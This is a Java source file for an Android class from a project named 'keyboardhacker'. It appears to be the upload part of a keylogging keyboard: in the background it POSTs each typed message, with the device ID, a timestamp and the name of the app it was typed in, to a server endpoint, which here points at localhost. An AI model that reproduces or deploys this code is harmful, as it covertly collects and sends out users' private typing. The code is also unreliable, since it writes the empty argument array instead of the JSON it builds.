package edu.cmu.keyboardhacker.simplekeyboard;

import android.os.AsyncTask;

import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Created by helunwen on 11/23/16.
 */
public class MessagService extends AsyncTask<Void, Void, Void> {

    private String deviceId;

    private String timestamp;

    private String message;

    private String applicaitonName;

    private String url = "http://localhost:8080/api/messages/add";

    private HttpURLConnection httpURLConnection;

    public MessagService(String deviceId, String timestamp, String message, String applicaitonName) {
        this.deviceId = deviceId;
        this.timestamp = timestamp;
        this.message = message;
        this.applicaitonName = applicaitonName;
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
            URL url = new URL(this.url);
            this.httpURLConnection = (HttpURLConnection) url.openConnection();
            this.httpURLConnection.setRequestMethod("POST");
            this.httpURLConnection.addRequestProperty("async", "true");
            this.httpURLConnection.addRequestProperty("crossDomain", "true");
            this.httpURLConnection.addRequestProperty("content-type", "application/x-www-form-urlencoded");
            this.httpURLConnection.addRequestProperty("cache-control", "no-cache");
            JSONObject jsonObjectData = new JSONObject();
            jsonObjectData.put("deviceId", this.deviceId);
            jsonObjectData.put("messageTime", this.timestamp);
            jsonObjectData.put("content", this.message);
            jsonObjectData.put("appName", this.applicaitonName);
            JSONObject parms = new JSONObject();
            parms.put("data", jsonObjectData);
            OutputStream output = new BufferedOutputStream(this.httpURLConnection.getOutputStream());
            output.write(params.toString().getBytes());
            output.flush();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            this.httpURLConnection.disconnect();
        }
        return null;
    }

}

